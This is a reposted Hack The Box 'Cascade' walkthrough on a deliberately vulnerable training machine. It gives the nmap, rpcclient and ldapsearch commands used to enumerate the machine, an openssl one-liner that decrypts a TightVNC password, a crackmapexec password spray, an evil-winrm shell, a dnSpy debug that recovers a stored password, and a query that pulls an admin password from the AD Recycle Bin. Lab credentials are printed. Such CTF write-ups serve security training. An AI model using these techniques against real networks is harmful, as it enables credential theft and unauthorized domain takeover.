# :arrows_counterclockwise: HTB | Cascade — Reverse Engineering - DnSpy and AD Recycle

> **Original Source:** [HTB | Cascade — Reverse Engineering - DnSpy and AD Recycle](https://infosecwriteups.com/htb-cascade-reverse-engineering-dnspy-and-ad-recycle-ecd045caca7d)
> **Platform:** infosecwriteups.com | **Category:** `REVERSE ENGINEERING`

---

# HTB | Cascade — Reverse Engineering - DnSpy and AD Recycle


This is the Box on [Hack The Box Active Directory 101 Track](https://app.hackthebox.com/tracks/Active-Directory-101). Find the box [here](https://app.hackthebox.com/machines/235).


You can find the Video Walkthrough [here](https://youtu.be/Ylol7DDcb7s)


Skill Learned


- TightVNC Password Extraction

- Active Directory Enumeration

- Reverse Engineering — DnSpy

- AD Recycle Bin

## NMAP


IP: 10.10.10.182


```
nmap -sT -p- --min-rate 10000 10.10.10.182
```


```
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,49154,49155,49157,49158,49165 10.10.10.182 -Pn
```


*nmap*

## SMB & RPC


SMBMAP and SMBClient are not working


```
smbmap -H 10.10.10.182
```


*smbmap -H 10.10.10.182*


Let’s try rpcclient


```
rpcclient -U "" -N 10.10.10.182
```


*rpcclient -U “” -N 10.10.10.182*


I will copy the users


Let’s see groups

*enumdomgroups*

## LDAP — TCP 389


To enumerate LDAP, first I’ll get the naming context:


```
ldapsearch -H ldap://10.10.10.182 -x -s base namingcontexts
```


*ldapsearch -H ldap://10.10.10.182 -x -s base namingcontexts*


I will dump all the info in a file:


```
ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-anonymous
```


And Now I will look for valuable information While looking in the file I found a password for Ryan

*Ryan’s Password*


Since it is a base64 I can decode it

*base64 decode*

## Foothold/shell


Let’s check the cred for Winrm and smb


*crackmapexec*


SMB is possible but winrm is not


```
smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
```


*smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva*


Since we have Read Only on soe shares let’s take a look


There are many files in each of the shares I have access to. I use the following commands to just pull all the files in each share (Data for example):


```
mask ""
recurse ON
prompt OFF
mget *
```


There are 5 folders


We found some files in the IT folder


```
find IT/ -type f
```


*find IT/ -type f*


On opening the Meeting Notes we found


*Meeting Notes*


According to the mail We have to keep an eye out for the admin account password and TempAdmin.


Let’s cat the VNC Install.reg*VNC Install.reg*


The line “Password”=hex:6b,cf,2a,4b,6e,5a,ca,0f jumped out as interesting.

## Crack TightVNC Password


This GitHub [repo](https://github.com/frizb/PasswordDecrypts) guides us to decrypt the VNC password using msfconsole


There was another way shown in the repo


```
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```


Now That we have the password let’s try it with SMB and WinRM.


## Get anuragtaparia’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Winrm worked


```
crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2
```


*crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2*


I’ll use Evil-WinRM to get a shell:


```
evil-winrm -i 10.10.10.182 -u s.smith -p 'sT333ve2'
```


*evil-winrm -i 10.10.10.182 -u s.smith -p ‘sT333ve2’*


and we are in. found user.txt

*user.txt*

## Priv Esc


s.smith is a member of the Audit Share group:


```
net user s.smith
```


*net user s.smith*


Since it is not a standard Microsoft group, let’s check


```
net localgroup "Audit Share"
```


*net localgroup “Audit Share”*


s.smith is the only user in the group, but the comment has a useful hint to look at this share. There’s a c:\shares, but I don’t have permission to list the directories in it:


however, I can cd into Shares\Audit based on the name from the comment


Since I have access to Audit Share:


```
smbmap -H 10.10.10.182 -u s.smith -p 'sT333ve2'
```


I will copy all the files to my local system


We found an Audit.db file


Let’s dump the tables using sqlite3


Nothing jumped out as particularly interesting. I thought the Ldap table could have had a password in it, but the base64-encoded data didn’t decode to ASCII. Perhaps it’s encrypted somehow.

## CascAudit.exe & DnSpy


RunAudit.bat shows that CascAudit.exe is run with the DB file as an argument:


It’s a .NET binary


Download [DnSpy](https://github.com/dnSpyEx) and load the exe on it


It opens an SQLite connection to the database passed as an arg, reading from the LDAP table, and decrypting the password.


I decided to recover the plaintext password by debugging. I put a breakpoint on line 53 where the SQL connection is closed. Then I went `Debug -> Start Debugging, `and set the Arugument to where I had a copy of the Audit.db:


Note: Copy all the files including SQLite dll files to Windows before starting the debug


On hitting OK, it runs to the breakpoint, and I can see the decrypted password in the Locals window:


Based on the line in the SQLite DB, this password, `w3lc0meFr31nd`, likely pairs with the account `arksvc`.


Let’s try this password for WinRM crackmapexec shows that not only does the password works:


Had I not known the account that was associated with this password, I could have used crackmapexec with a list of users(list that we git from rpcclient):


```
crackmapexec winrm 10.10.10.182 -u user.txt -p w3lc0meFr31nd --continue-on-success
```


*crackmapexec winrm 10.10.10.182 -u user.txt -p w3lc0meFr31nd — continue-on-success*


and we are in


from` whoami /groups` we can see arksvc is a part of AD Recycle


## AD Recycle


AD Recycle Bin is a well-known Windows group. [Active Directory Object Recovery](https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/) (or Recycle Bin) is a feature added in Server 2008 to allow administrators to recover deleted items just like the recycle bin does for files. The linked [article](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#a-d-recycle-bin) gives a PowerShell command to query all of the deleted objects within a domain:


```
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```


The last one is really interesting, because it’s the temporary administrator account mentioned in the old email I found earlier (which also said it was using the same password as the normal admin account).


I can get all the details for that account:


```
Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
```


Immediately `cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz` jumps out. It decodes to `baCT3r1aN00dles`:


using this password for the administrator account and we are in


and we have root.txt

*root.txt*


If you enjoyed this article and want to dive deeper into cybersecurity topics, feel free to explore my detailed write-ups on GitBook. I cover a range of topics including vulnerability assessments, penetration testing techniques, and security methodologies.


👉 [Check out my GitBook for more insights](https://anuragtaparia.gitbook.io/write-ups)


👉 Watch my videos on YouTube: [AnuragSec](http://www.youtube.com/@AnuragSec)


Stay tuned for more content, and don’t forget to follow for future updates!

---

*Originally published on [Medium](https://infosecwriteups.com/htb-cascade-reverse-engineering-dnspy-and-ad-recycle-ecd045caca7d). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of reverse engineering CTF writeups.*
